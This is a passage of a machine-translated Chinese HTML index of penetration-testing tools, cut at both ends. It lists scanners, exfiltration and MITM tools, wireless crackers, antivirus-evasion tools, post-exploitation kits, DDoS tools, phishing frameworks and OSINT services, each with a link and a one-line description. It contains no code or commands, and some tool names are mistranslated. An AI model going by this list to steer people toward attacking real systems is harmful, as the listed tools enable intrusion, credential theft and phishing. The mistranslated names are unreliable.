id="静态分析仪"><a href="#静态分析仪" class="headerlink" title="静态分析仪"></a>静态分析仪</h4><ul><li><a href="https://github.com/presidentbeef/brakeman">Brakeman</a> – 用于Ruby on Rails应用程序的静态分析安全漏洞扫描程序。</li><li><a href="http://cppcheck.sourceforge.net/">cppcheck</a> – 可扩展的C / C ++静态分析器专注于发现错误。</li><li><a href="http://findbugs.sourceforge.net/">FindBugs</a> – 免费软件静态分析器，用于查找Java代码中的错误。</li><li><a href="https://github.com/nccgroup/sobelow">sobelow</a> – 针对凤凰城框架的以安全为中心的静态分析。</li><li><a href="https://pypi.python.org/pypi/bandit/">强盗</a> – 面向安全的python代码静态分析器。</li><li><a href="https://github.com/designsecurity/progpilot">Progpilot</a> – 用于PHP代码的静态安全分析工具。</li><li><a href="https://github.com/jagracey/RegEx-DoS">RegEx-DoS</a> – 分析易受拒绝服务攻击的正则表达式的源代码。</li></ul><h4 id="Web漏洞扫描程序"><a href="#Web漏洞扫描程序" class="headerlink" title="Web漏洞扫描程序"></a>Web漏洞扫描程序</h4><ul><li><a href="https://www.netsparker.com/">Netsparker应用程序安全扫描程序</a> – 应用程序安全扫描程序自动查找安全漏洞。</li><li><a href="https://cirt.net/nikto2">Nikto</a> – 嘈杂但快速的黑匣子Web服务器和Web应用程序漏洞扫描程序。</li><li><a href="http://www.arachni-scanner.com/">Arachni</a> – 用于评估Web应用程序安全性的可编写脚本的框架。</li><li><a href="https://github.com/andresriancho/w3af">w3af</a> – Web应用程序攻击和审计框架。</li><li><a href="http://wapiti.sourceforge.net/">Wapiti</a> – 内置模糊器的黑匣子Web应用程序漏洞扫描程序。</li><li><a href="https://secapps.com/">SecApps</a> – 浏览器内Web应用程序安全测试套件。</li><li><a href="https://www.webreaver.com/">WebReaver</a> – 专为macOS设计的商业，图形Web应用程序漏洞扫描程序。</li><li><a href="https://wpscan.org/">WPScan</a> – 黑匣子WordPress漏洞扫描程序。</li><li><a href="https://code.google.com/archive/p/cms-explorer/">cms-explorer</a> – 显示由内容管理系统驱动的各种网站正在运行的特定模块，插件，组件和主题。</li><li><a href="https://www.owasp.org/index.php/Category:OWASP_Joomla_Vulnerability_Scanner_Project">joomscan</a> – Joomla漏洞扫描程序。</li><li><a href="https://github.com/tijme/angularjs-csti-scanner">ACSTIS</a> – <a href="https://github.com/tijme/angularjs-csti-scanner">AngularJS的</a>自动客户端模板注入（沙箱转义/旁路）检测。</li><li><a href="https://github.com/UltimateHackers/sqlmate">SQLmate</a> – <a href="https://github.com/UltimateHackers/sqlmate">sqlmap的</a>一个朋友，它根据给定的dork和网站识别sqli漏洞（可选）。</li><li><a href="https://github.com/TheM4hd1/JCS">JCS</a> – 具有来自exploitdb和packetstorm的自动数据库更新程序的Joomla漏洞组件扫描程序。</li></ul><h3 id="网络工具"><a href="#网络工具" class="headerlink" title="网络工具"></a>网络工具</h3><ul><li><a href="https://github.com/rafael-santiago/pig">pig</a> – GNU / Linux数据包制作工具。</li><li><a href="https://network-tools.com/">Network-Tools.com</a> -网站上提供的接口众多基本的网络工具一样<code>ping</code>，<code>traceroute</code>，<code>whois</code>，等等。</li><li><a href="http://sniff.su/">Intercepter-NG</a> – 多功能网络工具包。</li><li><a href="https://sparta.secforce.com/">SPARTA</a> – 图形界面，提供对现有网络基础架构扫描和枚举工具的可编写脚本的可配置访问。</li><li><a href="https://github.com/hatRiot/zarp">Zarp</a> – 以攻击本地网络为中心的网络攻击工具。</li><li><a href="https://www.monkey.org/~dugsong/dsniff/">dsniff</a> – 用于网络审计和测试的工具集。</li><li><a href="https://github.com/secdev/scapy">scapy</a> – 基于Python的交互式数据包操作程序和库。</li><li><a href="https://github.com/RUB-NDS/PRET">打印机开发工具包（PRET）</a> – 用于打印机安全测试的工具，能够进行IP和USB连接，模糊测试以及利用PostScript，PJL和PCL打印机语言功能。</li><li><a href="http://h.foofus.net/?page_id=218">Praeda</a> – 自动化多功能打印机数据采集器，用于在安全评估期间收集可用数据。</li><li><a href="https://github.com/reverse-shell/routersploit">routersploit</a> – 类似于Metasploit但专用于嵌入式设备的开源开发框架。</li><li><a href="https://github.com/byt3bl33d3r/CrackMapExec">CrackMapExec</a> – 用于测试网络的瑞士军刀。</li><li><a href="https://github.com/CoreSecurity/impacket">impacket</a> – 用于处理网络协议的Python类集合。</li><li><a href="https://github.com/elceef/dnstwist">dnstwist</a> – 用于检测拼写错误，网络钓鱼和企业间谍活动的域名置换引擎。</li><li><a href="https://github.com/vanhauser-thc/thc-hydra">THC Hydra</a> – 在线密码破解工具，内置支持许多网络协议，包括HTTP，SMB，FTP，telnet，ICQ，MySQL，LDAP，IMAP，VNC等。</li><li><a href="https://github.com/SpiderLabs/ikeforce">IKEForce</a> – 用于Linux的命令行IPSEC VPN暴力破解工具，允许组名/ ID枚举和XAUTH暴力破解功能。</li><li><a href="https://github.com/antirez/hping">hping3</a> – 能够发送自定义TCP / IP数据包的网络工具。</li><li><a href="https://github.com/kpcyrd/rshijack">rshijack</a> – TCP连接劫持者，Rust重写<code>shijack</code>。</li></ul><h4 id="Exfiltration工具"><a href="#Exfiltration工具" class="headerlink" title="Exfiltration工具"></a>Exfiltration工具</h4><ul><li><a href="https://github.com/sensepost/DET">DET</a> – 使用单个或多个通道同时执行数据泄漏的概念证明。</li><li><a href="https://github.com/samyk/pwnat">pwnat</a> – 在防火墙和NAT中打孔。</li><li><a href="http://tgcd.sourceforge.net/">tgcd</a> – 简单的Unix网络实用程序，用于扩展基于TCP / IP的网络服务在防火墙之外的可访问性。</li><li><a href="https://code.kryo.se/iodine/">碘</a> – 通过DNS服务器隧道传输IPv4数据; 对于从防火墙访问互联网的网络中进行渗透非常有用，但允许进行DNS查询。</li><li><a href="https://github.com/TryCatchHCF/Cloakify">Cloakify</a> – 文本隐写术工具包，可将任何文件类型转换为日常字符串列表。</li></ul><h4 id="网络侦察工具"><a href="#网络侦察工具" class="headerlink" title="网络侦察工具"></a>网络侦察工具</h4><ul><li><a href="https://zmap.io/">zmap</a> – 开源网络扫描仪，使研究人员能够轻松执行互联网范围的网络研究。</li><li><a href="https://nmap.org/">nmap</a> – 用于网络探索和安全审计的免费安全扫描程序。</li><li><a href="https://github.com/vesche/scanless">scanless</a> – 用于代表您使用网站执行端口扫描的实用程序，以便不显示您自己的IP。</li><li><a href="https://dnsdumpster.com/">DNSDumpster</a> – 在线DNS侦察和搜索服务。</li><li><a href="https://github.com/m0rtem/CloudFail">CloudFail</a> – 通过搜索旧数据库记录并检测配置错误的DNS，<a href="https://github.com/m0rtem/CloudFail">揭示</a>隐藏在Cloudflare后面的服务器IP地址。</li><li><a href="https://github.com/fwaeytens/dnsenum/">dnsenum</a> – Perl脚本，用于枚举域中的DNS信息，尝试区域传输，执行强力字典样式攻击，然后对结果执行反向查找。</li><li><a href="https://github.com/makefu/dnsmap/">dnsmap</a> – 被动DNS网络映射器。</li><li><a href="https://github.com/darkoperator/dnsrecon/">dnsrecon</a> – DNS枚举脚本。</li><li><a href="http://www.mavetju.org/unix/dnstracer.php">dnstracer</a> – 确定给定DNS服务器从哪里获取其信息，并遵循DNS服务器链。</li><li><a href="https://github.com/chrislee35/passivedns-client">passivedns-client</a> – 用于查询多个被动DNS提供程序的库和查询工具。</li><li><a href="https://github.com/gamelinux/passivedns">passivedns</a> – 网络嗅探器，记录所有DNS服务器回复，以便在被动DNS设置中使用。</li><li><a href="https://github.com/robertdavidgraham/masscan">Mass Scan</a> – TCP端口扫描程序，异步喷出SYN数据包，在5分钟内扫描整个Internet。</li><li><a href="https://github.com/ShawnDEvans/smbmap">smbmap</a> – 方便的SMB枚举工具。</li><li><a href="https://github.com/evilsocket/xray">XRay</a> – 网络（子）域发现和侦察自动化工具。</li><li><a href="https://github.com/cyberark/ACLight">ACLight</a> – 用于高级发现敏感特权帐户的脚本 – 包括Shadow Admins。</li><li><a href="https://github.com/johnnyxmas/ScanCannon">ScanCannon</a> – Python脚本，通过调用<code>masscan</code>快速识别开放端口，然后<code>nmap</code>获取有关这些端口上的系统/服务的详细信息，快速枚举大型网络。</li><li><a href="https://github.com/mschwager/fierce">fierce</a> – <code>fierce.pl</code>用于定位非连续IP空间的原始DNS侦察工具的Python3端口。</li></ul><h4 id="协议分析仪和嗅探器"><a href="#协议分析仪和嗅探器" class="headerlink" title="协议分析仪和嗅探器"></a>协议分析仪和嗅探器</h4><ul><li><a href="http://www.tcpdump.org/">tcpdump / libpcap</a> – 在命令行下运行的通用数据包分析器。</li><li><a href="https://www.wireshark.org/">Wireshark</a> – 广泛使用的图形化，跨平台网络协议分析仪。</li><li><a href="https://github.com/netsniff-ng/netsniff-ng">netsniff-ng</a> – 用于网络嗅探的瑞士军刀。</li><li><a href="https://github.com/USArmyResearchLab/Dshell">Dshell</a> – 网络取证分析框架。</li><li><a href="http://www.iwaxx.com/debookee/">Debookee</a> – 用于macOS的简单而强大的网络流量分析器。</li><li><a href="https://github.com/dripcap/dripcap">Dripcap</a> – 含咖啡因的包装分析仪。</li><li><a href="https://github.com/netzob/netzob">Netzob</a> – 反向工程，流量生成和通信协议的模糊测试。</li><li><a href="https://github.com/kpcyrd/sniffglue">sniffglue</a> – 安全的多线程数据包嗅探器。</li></ul><h4 id="代理和MITM工具"><a href="#代理和MITM工具" class="headerlink" title="代理和MITM工具"></a>代理和MITM工具</h4><ul><li><a href="https://github.com/iphelix/dnschef">dnschef</a> – 用于测试人员的高度可配置的DNS代理。</li><li><a href="https://github.com/mitmproxy/mitmproxy">mitmproxy</a> – 支持交互式TLS的拦截HTTP代理，用于渗透测试人员和软件开发人员。</li><li><a href="https://github.com/r00t-3xp10it/morpheus">Morpheus</a> – 自动ettercap TCP / IP劫持工具。</li><li><a href="https://github.com/justmao945/mallory">mallory</a> – SSH上的HTTP / HTTPS代理。</li><li><a href="https://github.com/jtesta/ssh-mitm">SSH MITM</a> – 使用代理拦截SSH连接; 所有明文密码和会话都记录在磁盘上。</li><li><a href="https://github.com/infobyte/evilgrade">evilgrade</a> – 通过注入虚假更新来利用不良升级实现的模块化框架。</li><li><a href="http://www.ettercap-project.org/">Ettercap</a> – 全面，成熟的机器中间攻击套件。</li><li><a href="https://www.bettercap.org/">BetterCAP</a> – 模块化，可移植且易于扩展的MITM框架。</li><li><a href="https://github.com/byt3bl33d3r/MITMf">MITMf</a> – 中间人攻击框架。</li><li><a href="https://github.com/puresec/lambda-proxy">Lambda-Proxy</a> – 用于测试AWS Lambda无服务器功能上的SQL注入漏洞的实用程序。</li></ul><h3 id="无线网络工具"><a href="#无线网络工具" class="headerlink" title="无线网络工具"></a>无线网络工具</h3><ul><li><a href="https://www.aircrack-ng.org/">Aircrack-ng</a> – 用于审核无线网络的工具集。</li><li><a href="https://kismetwireless.net/">Kismet</a> – 无线网络探测器，嗅探器和IDS。</li><li><a href="https://code.google.com/archive/p/reaver-wps">掠夺者</a> – 对WiFi保护设置的暴力攻击。</li><li><a href="https://github.com/derv82/wifite">Wifite</a> – 自动无线攻击工具。</li><li><a href="https://github.com/FluxionNetwork/fluxion">Fluxion</a> – 基于自动社交工程的WPA攻击套件。</li><li><a href="https://github.com/v1s1t0r1sh3r3/airgeddon">Airgeddon</a> – 用于Linux系统的多用途bash脚本，用于审计无线网络。</li><li><a href="https://github.com/joswr1ght/cowpatty">Cowpatty</a> – 对WPA-PSK的暴力字典攻击。</li><li><a href="https://github.com/MisterBianco/BoopSuite">BoopSuite</a> – 用Python编写的无线审计工具套件。</li><li><a href="http://git.kali.org/gitweb/?p=packages/bully.git;a=summary">欺负</a> – 以C编写的WPS暴力攻击的实施。</li><li><a href="https://github.com/entropy1337/infernal-twin">infernal-twin</a> – 自动无线黑客工具。</li><li><a href="https://github.com/vanhoefm/krackattacks-scripts">krackattacks-scripts</a> – WPA2 Krack攻击脚本。</li><li><a href="https://github.com/securingsam/krackdetector">KRACK Detector</a> – 检测并防止网络中的KRACK攻击。</li><li><a href="https://github.com/0x90/wifi-arsenal">wifi-arsenal</a> – 用于Wi-Fi Pentesting的资源。</li><li><a href="https://github.com/P0cL4bs/WiFi-Pumpkin">WiFi-Pumpkin</a> – 流氓Wi-Fi接入点攻击框架。</li></ul><h3 id="传输层安全工具"><a href="#传输层安全工具" class="headerlink" title="传输层安全工具"></a>传输层安全工具</h3><ul><li><a href="https://github.com/nabla-c0d3/sslyze">SSLyze</a> – 快速而全面的TLS / SSL配置分析器，可帮助识别安全性错误配置。</li><li><a href="https://github.com/WestpointLtd/tls_prober">tls_prober</a> – 指纹服务器的SSL / TLS实现。</li><li><a href="https://github.com/drwetter/testssl.sh">testssl.sh</a> – 命令行工具，用于检查任何端口上的服务器服务，以支持TLS / SSL密码，协议以及一些加密缺陷。</li><li><a href="https://github.com/crackpkcs12/crackpkcs12">crackpkcs12</a> – 用于破解PKCS＃12文件（<code>.p12</code>和<code>.pfx</code>扩展）的多线程程序，例如TLS / SSL证书。</li></ul><h3 id="网络开发"><a href="#网络开发" class="headerlink" title="网络开发"></a>网络开发</h3><ul><li><a href="https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project">OWASP Zed攻击代理（ZAP）</a> – 用于渗透测试Web应用程序的功能丰富，可编写脚本的HTTP拦截代理和模糊器。</li><li><a href="https://www.telerik.com/fiddler">Fiddler</a> – 免费的跨平台Web调试代理，具有用户友好的配套工具。</li><li><a href="https://portswigger.net/burp/">Burp Suite</a> – 用于执行Web应用程序安全性测试的集成平台。</li><li><a href="https://www.nccgroup.trust/us/about-us/newsroom-and-events/blog/2017/march/autochrome/">autochrome</a> – 使用来自NCCGroup的本机Burp支持，轻松安装具有所需的所有适当设置的测试浏览器。</li><li><a href="https://github.com/beefproject/beef">浏览器漏洞利用框架（BeEF）</a> – 用于向被<a href="https://github.com/beefproject/beef">征用的</a> Web浏览器提供漏洞利用的命令和控制服务器。</li><li><a href="https://www.owasp.org/index.php/OWASP_OWTF">攻击性Web测试框架（OWTF）</a> – 基于Python的框架，用于基于OWASP测试指南测试Web应用程序。</li><li><a href="https://github.com/rastating/wordpress-exploit-framework">WordPress漏洞利用框架</a> – 用于开发和使用模块的Ruby框架，有助于对WordPress驱动的网站和系统进行渗透测试。</li><li><a href="https://github.com/espreto/wpsploit">WPSploit</a> – 利用Metasploit利用WordPress驱动的网站。</li><li><a href="http://sqlmap.org/">SQLmap</a> – 自动SQL注入和数据库接管工具。</li><li><a href="https://github.com/epinna/tplmap">tplmap</a> – 自动服务器端模板注入和Web服务器接管工具。</li><li><a href="https://github.com/epinna/weevely3">weevely3</a> – 武器化的网络外壳。</li><li><a href="https://www.wappalyzer.com/">Wappalyzer</a> – Wappalyzer揭示了网站上使用的技术。</li><li><a href="https://github.com/urbanadventurer/WhatWeb">WhatWeb</a> – 网站指纹识别器。</li><li><a href="http://blindelephant.sourceforge.net/">BlindElephant</a> – Web应用程序指纹识别器。</li><li><a href="https://github.com/EnableSecurity/wafw00f">wafw00f</a> – 标识和指纹Web应用程序防火墙（WAF）产品。</li><li><a href="https://github.com/kurobeats/fimap">fimap</a> – 自动查找，准备，审核，利用甚至谷歌的LFI / RFI错误。</li><li><a href="https://github.com/D35m0nd142/Kadabra">Kadabra</a> – 自动LFI开发者和扫描仪。</li><li><a href="https://github.com/P0cL4bs/Kadimus">Kadimus</a> – LFI扫描和利用工具。</li><li><a href="https://github.com/hvqzao/liffy">liffy</a> – LFI开发工具。</li><li><a href="https://github.com/commixproject/commix">Commix</a> – 自动化一体化操作系统命令注入和利用工具。</li><li><a href="https://github.com/kost/dvcs-ripper">DVCS Ripper</a> – Rip Web可访问（分布式）版本控制系统：SVN / GIT / HG / BZR。</li><li><a href="https://github.com/internetwache/GitTools">GitTools</a> – 自动查找和下载Web可访问的<code>.git</code>存储库。</li><li><a href="https://www.thoughtcrime.org/software/sslstrip/">sslstrip</a> – 证明HTTPS剥离攻击。</li><li><a href="https://github.com/LeonardoNve/sslstrip2">sslstrip2</a> – SSLStrip版本击败HSTS。</li><li><a href="https://github.com/codingo/NoSQLMap">NoSQLmap</a> – 自动NoSQL注入和数据库接管工具。</li><li><a href="https://github.com/codingo/VHostScan">VHostScan</a> – 执行反向查找的虚拟主机扫描程序，可与数据透视工具一起使用，检测全能方案，别名和动态默认页面。</li><li><a href="https://github.com/fuzzdb-project/fuzzdb">FuzzDB</a> – 用于黑盒应用程序故障注入和资源发现的攻击模式和原语词典。</li><li><a href="https://github.com/ChrisTruncer/EyeWitness">EyeWitness</a> – 用于截取网站屏幕截图，提供一些服务器标头信息以及识别默认凭据的工具（如果可能）。</li><li><a href="https://github.com/maaaaz/webscreenshot">webscreenshot</a> – 一个简单的脚本，可以截取网站列表的截图。</li><li><a href="https://github.com/c-sto/recursebuster">recursebuster</a> – 用于执行目录和文件<a href="https://github.com/c-sto/recursebuster">强制</a>执行的内容发现工具。</li><li><a href="https://github.com/evyatarmeged/Raccoon">Raccoon</a> – 用于侦察和漏洞扫描的高性能攻击性安全工具。</li><li><a href="https://github.com/Ekultek/WhatWaf">WhatWaf</a> – 检测并绕过Web应用程序防火墙和保护系统。</li><li><a href="https://github.com/kpcyrd/badtouch">badtouch</a> – 可编写脚本的网络身份验证破解程序。</li></ul><h3 id="十六进制编辑器"><a href="#十六进制编辑器" class="headerlink" title="十六进制编辑器"></a>十六进制编辑器</h3><ul><li><a href="https://hexed.it/">HexEdit.js</a> – 基于浏览器的十六进制编辑。</li><li><a href="https://hexinator.com/">Hexinator</a> – 世界上最好的（专有的，商业的）Hex Editor。</li><li><a href="http://frhed.sourceforge.net/">Frhed</a> – Windows的二进制文件编辑器。</li><li><a href="http://www.suavetech.com/0xed/0xed.html">0xED</a> – 本机macOS十六进制编辑器，支持插件显示自定义数据类型。</li><li><a href="http://ridiculousfish.com/hexfiend/">Hex Fiend</a> – 用于macOS的快速，开源，十六进制编辑器，支持查看二进制差异。</li><li><a href="https://github.com/bwrsandman/Bless">Bless</a> – 用Gtk＃编写的高质量，全功能，跨平台的图形十六进制编辑器。</li><li><a href="http://www.wxhexeditor.org/">wxHexEditor</a> – 适用于GNU / Linux，macOS和Windows的免费GUI十六进制编辑器。</li><li><a href="https://github.com/pixel/hexedit"><code>hexedit</code></a> – 简单，快速，基于控制台的十六进制编辑器。</li></ul><h3 id="文件格式分析工具"><a href="#文件格式分析工具" class="headerlink" title="文件格式分析工具"></a>文件格式分析工具</h3><ul><li><a href="http://kaitai.io/">Kaitai Struct</a> – 文件格式和网络协议剖析语言和Web IDE，使用C ++，C＃，Java，JavaScript，Perl，PHP，Python，Ruby生成解析器。</li><li><a href="https://codisec.com/veles/">Veles</a> – 二进制数据可视化和分析工具。</li><li><a href="https://hachoir.readthedocs.io/">Hachoir</a> – 用于查看和编辑二进制流的Python库，作为用于元数据提取的字段和工具树。</li></ul><h3 id="防病毒逃生工具"><a href="#防病毒逃生工具" class="headerlink" title="防病毒逃生工具"></a>防病毒逃生工具</h3><ul><li><a href="https://www.veil-framework.com/">面纱</a> – 生成绕过常见防病毒解决方案的metasploit有效负载。</li><li><a href="https://github.com/Exploit-install/shellsploit-framework">shellsploit</a> – 生成自定义shellcode，后门，注入器，可选择通过编码器对每个字节进行混淆。</li><li><a href="http://nullsecurity.net/tools/binary.html">Hyperion</a> – 用于32位可移植可执行文件的运行时加密程序（“PE <code>.exe</code>s”）。</li><li><a href="https://github.com/govolution/avet">AntiVirus Evasion Tool（AVET）</a> – 包含针对Windows机器的可执行文件的后处理漏洞，以避免被防病毒软件识别。</li><li><a href="https://www.securitysift.com/pecloak-py-an-experiment-in-av-evasion/">peCloak.py</a> – 自动隐藏来自防病毒（AV）检测的恶意Windows可执行文件的过程。</li><li><a href="https://github.com/v-p-b/peCloakCapstone">peCloakCapstone</a> – peCloak.py自动恶意软件防病毒逃避工具的多平台分支。</li><li><a href="https://github.com/Mr-Un1k0d3r/UniByAv">UniByAv</a> – 简单的混淆器，它使用原始shellcode并使用强制执行的32位XOR密钥生成反病毒友好的可执行文件。</li><li><a href="https://www.shellterproject.com/">Shellter</a> – 动态shellcode注入工具，以及有史以来第一个真正动态的PE infector。</li></ul><h3 id="哈希破解工具"><a href="#哈希破解工具" class="headerlink" title="哈希破解工具"></a>哈希破解工具</h3><ul><li><a href="https://www.openwall.com/john/">开膛手约翰</a> – 快速密码破解者。</li><li><a href="https://hashcat.net/hashcat/">Hashcat</a> – 更快速的哈希破解者。</li><li><a href="https://digi.ninja/projects/cewl.php">CeWL</a> – 通过抓取目标网站并收集独特单词来生成自定义单词列表。</li><li><a href="https://github.com/lmammino/jwt-cracker">JWT Cracker</a> – 简单的HS256 JWT令牌蛮力饼干。</li><li><a href="http://rarcrack.sourceforge.net/">Rar Crack</a> – RAR暴力破解者。</li><li><a href="https://github.com/glv2/bruteforce-wallet">BruteForce Wallet</a> – 查找加密钱包文件的密码（即<code>wallet.dat</code>）。</li><li><a href="https://github.com/Paradoxis/StegCracker">StegCracker</a> – 用于发现文件中隐藏数据的Steganography强力实用程序。</li></ul><h3 id="WINDOWS实用工具"><a href="#WINDOWS实用工具" class="headerlink" title="WINDOWS实用工具"></a>WINDOWS实用工具</h3><ul><li><a href="https://technet.microsoft.com/en-us/sysinternals/bb842062">Sysinternals Suite</a> – Sysinternals疑难解答实用程序。</li><li><a href="https://www.ampliasecurity.com/research/windows-credentials-editor/">Windows凭据编辑器</a> – 检查登录会话并添加，更改，列出和删除关联的凭据，包括Kerberos票证。</li><li><a href="http://blog.gentilkiwi.com/mimikatz">mimikatz</a> – 适用于Windows操作系统的凭据提取工具。</li><li><a href="https://github.com/PowerShellMafia/PowerSploit">PowerSploit</a> – PowerShell后利用框架。</li><li><a href="https://github.com/GDSSecurity/Windows-Exploit-Suggester">Windows漏洞利用建议器</a> – 检测目标上可能缺少的补丁。</li><li><a href="https://github.com/SpiderLabs/Responder">响应者</a> – 链路本地多播名称解析（LLMNR），NBT-NS和mDNS中毒。</li><li><a href="https://github.com/adaptivethreat/Bloodhound/wiki">Bloodhound</a> – 图形Active Directory信任关系资源管理器。</li><li><a href="https://www.powershellempire.com/">帝国</a> – 纯PowerShell后期开发代理。</li><li><a href="https://github.com/rabbitstack/fibratus">Fibratus</a> – 用于探索和跟踪Windows内核的工具。</li><li><a href="https://labs.mwrinfosecurity.com/tools/wepwnise/">wePWNise</a> – 生成与Office文档或模板中使用的体系结构无关的VBA代码，并自动绕过应用程序控制并利用缓解软件。</li><li><a href="https://github.com/nccgroup/redsnarf">redsnarf</a> – 用于从Windows工作站，服务器和域控制器检索密码哈希和凭据的后期利用工具。</li><li><a href="https://github.com/trustedsec/unicorn">Magic Unicorn</a> – 用于众多攻击媒介的Shellcode生成器，包括Microsoft Office宏，PowerShell，HTML应用程序（HTA）或<code>certutil</code>（使用假证书）。</li><li><a href="https://github.com/byt3bl33d3r/DeathStar">DeathStar</a> – 使用Empire的RESTful API自动获取Active Directory环境中的域管理员权限的Python脚本。</li><li><a href="https://github.com/trustedsec/ridenum">RID_ENUM</a> – 可以枚举Windows域控制器中所有用户并使用暴力破解这些用户密码的Python脚本。</li><li><a href="https://github.com/dafthack/MailSniper">MailSniper</a> – 用于在Microsoft Exchange环境中搜索电子邮件，从Outlook Web Access（OWA）和Exchange Web服务（EWS）收集全局地址列表等的模块化工具。</li><li><a href="https://github.com/sensepost/ruler">标尺</a> – 滥用客户端Outlook功能以获取Microsoft Exchange服务器上的远程shell。</li><li><a href="https://github.com/nccgroup/SCOMDecrypt">SCOMDecrypt</a> – 检索并解密存储在Microsoft System Center Operations Manager（SCOM）数据库中的RunAs凭据。</li><li><a href="https://github.com/AlessandroZ/LaZagne">LaZagne</a> – 凭证恢复项目。</li><li><a href="https://github.com/hausec/ADAPE-Script">Active Directory和权限提升（ADAPE）</a> – Umbrella脚本，可自动执行大量有用的PowerShell模块，以发现安全性错误配置并尝试针对Active Directory进行权限提升。</li></ul><h3 id="GNU-LINUX实用程序"><a href="#GNU-LINUX实用程序" class="headerlink" title="GNU / LINUX实用程序"></a>GNU / LINUX实用程序</h3><ul><li><a href="https://github.com/PenturaLabs/Linux_Exploit_Suggester">Linux Exploit Suggester</a> – 针对给定GNU / Linux系统的潜在可行漏洞的启发式报告。</li><li><a href="https://cisofy.com/lynis/">Lynis</a> – 基于UNIX的系统的审计工具。</li><li><a href="https://github.com/pentestmonkey/unix-privesc-check">unix-privesc-check</a> – 用于检查UNIX系统上的简单权限提升向量的Shell脚本。</li><li><a href="https://github.com/n00py/Hwacha">Hwacha</a> – 用于在一个或多个Linux系统上同时通过SSH快速执行有效负载的后期利用工具。</li><li><a href="https://www.trapkit.de/tools/checksec.html">checksec.sh</a> – 用于测试正在使用的标准Linux OS和PaX安全功能的Shell脚本。</li><li><a href="https://github.com/rebootuser/LinEnum">LinEnum</a> – 脚本本地Linux枚举和权限提升检查程序，可用于审核主机和CTF游戏期间。</li></ul><h3 id="MACOS实用工具"><a href="#MACOS实用工具" class="headerlink" title="MACOS实用工具"></a>MACOS实用工具</h3><ul><li><a href="https://github.com/kdaoudieh/Bella">Bella</a> – 用于macOS的纯Python后期开发数据挖掘和远程管理工具。</li><li><a href="https://github.com/Marten4n6/EvilOSX">EvilOSX</a> – 模块化RAT，使用大量的逃避和渗透技术开箱即用。</li></ul><h3 id="DDOS工具"><a href="#DDOS工具" class="headerlink" title="DDOS工具"></a>DDOS工具</h3><ul><li><a href="https://github.com/NewEraCracker/LOIC/">LOIC</a> – 适用于Windows的开源网络压力工具。</li><li><a href="http://metacortexsecurity.com/tools/anon/LOIC/LOICv1.html">JS LOIC</a> – <a href="http://metacortexsecurity.com/tools/anon/LOIC/LOICv1.html">LOIC的</a> JavaScript浏览器版本。</li><li><a href="https://github.com/gkbrk/slowloris">SlowLoris</a> – 在攻击方使用低带宽的DoS工具。</li><li><a href="https://sourceforge.net/projects/high-orbit-ion-cannon/">HOIC</a> – 低轨道离子炮的更新版本，有“助推器”来解决常见的对抗措施。</li><li><a href="https://gitlab.com/fredericopissarra/t50/">T50</a> – 更快的网络压力工具。</li><li><a href="https://github.com/epsylon/ufonet">UFONet</a> – 滥用OSI第7层HTTP来创建/管理“僵尸”并使用其进行不同的攻击; <code>GET</code>/ <code>POST</code>，多线程，代理，原始欺骗方法，缓存规避技术等。</li><li><a href="https://github.com/649/Memcrashed-DDoS-Exploit">Memcrashed</a> – DDoS攻击工具，用于将伪造的UDP数据包发送到使用Shodan API获取的易受攻击的Memcached服务器。</li></ul><h3 id="社会工程工具"><a href="#社会工程工具" class="headerlink" title="社会工程工具"></a>社会工程工具</h3><ul><li><a href="https://github.com/trustedsec/social-engineer-toolkit">社会工程师工具包（SET）</a> – 为社会工程设计的开源测试框架，具有许多自定义攻击向量，可以快速进行可信的攻击。</li><li><a href="https://github.com/securestate/king-phisher">King Phisher</a> – 网络钓鱼活动工具包，用于使用自定义电子邮件和服务器内容创建和管理多个同时网络钓鱼攻击。</li><li><a href="https://github.com/kgretzky/evilginx">Evilginx</a> – 用于任何Web服务的网络钓鱼凭据和会话cookie的MITM攻击框架。</li><li><a href="https://github.com/kgretzky/evilginx2">Evilginx2</a> – 独立的man-in-the-middle攻击框架。</li><li><a href="https://github.com/sophron/wifiphisher">wifiphisher</a> – 针对WiFi网络的自动网络钓鱼攻击。</li><li><a href="https://github.com/ring0lab/catphish">Catphish</a> – 用Ruby编写的网络钓鱼和企业间谍工具。</li><li><a href="https://github.com/4w4k3/BeeLogger">Beelogger</a> – 用于生成keylooger的工具。</li><li><a href="https://github.com/Raikia/FiercePhish">FiercePhish</a> – 完善的网络钓鱼框架，用于管理所有网络钓鱼活动。</li><li><a href="https://github.com/UndeadSec/SocialFish">SocialFish</a> – 社交媒体网络钓鱼框架，可以在Android手机或Docker容器中运行。</li><li><a href="https://github.com/thelinuxchoice/shellphish">ShellPhish</a> – 在SocialFish上建立的社交媒体网站克隆和网络钓鱼工具。</li><li><a href="https://getgophish.com/">Gophish</a> – 开源网络钓鱼框架。</li><li><a href="https://github.com/ryhanson/phishery">phishery</a> – 启用TLS / SSL的Basic Auth凭证收集器。</li><li><a href="https://github.com/fireeye/ReelPhish">ReelPhish</a> – 实时双因素网络钓鱼工具。</li><li><a href="https://github.com/drk1wi/Modlishka">Modlishka</a> – 灵活而强大的反向代理，具有实时双因素身份验证。</li></ul><h3 id="OSINT工具"><a href="#OSINT工具" class="headerlink" title="OSINT工具"></a>OSINT工具</h3><ul><li><a href="http://www.paterva.com/web7/">Maltego</a> – 来自Paterva的开源智能和取证专有软件。</li><li><a href="https://github.com/laramies/theHarvester">theHarvester</a> – 电子邮件，子域和人名收割机。</li><li><a href="https://github.com/SimplySecurity/SimplyEmail">SimplyEmail</a> – 电子邮件侦察快速简便。</li><li><a href="https://github.com/ilektrojohn/creepy">令人毛骨悚然</a> – 地理定位OSINT工具。</li><li><a href="https://github.com/laramies/metagoofil">metagoofil</a> – 元数据收集器。</li><li><a href="https://www.exploit-db.com/google-hacking-database/">Google Hacking Database</a> – Google dorks数据库; 可用于侦察。</li><li><a href="https://github.com/k3170makan/GooDork">GooDork</a> – 命令行谷歌<a href="https://github.com/k3170makan/GooDork">dorking</a>工具。</li><li><a href="https://github.com/jgor/dork-cli">dork-cli</a> – 命令行谷歌dork工具。</li><li><a href="https://www.censys.io/">Censys</a> – 通过每日ZMap和ZGrab扫描收集主机和网站上的数据。</li><li><a href="https://www.shodan.io/">Shodan</a> – 世界上第一个用于互联网设备的搜索引擎。</li><li><a href="https://bitbucket.org/LaNMaSteR53/recon-ng">recon-ng</a> – 用Python编写的全功能Web侦察框架。</li><li><a href="https://github.com/kpcyrd/sn0int">sn0int</a> – 半自动OSINT框架和包管理器。</li><li><a href="https://github.com/techgaun/github-dorks">github-dorks</a> – 用于扫描GitHub repos 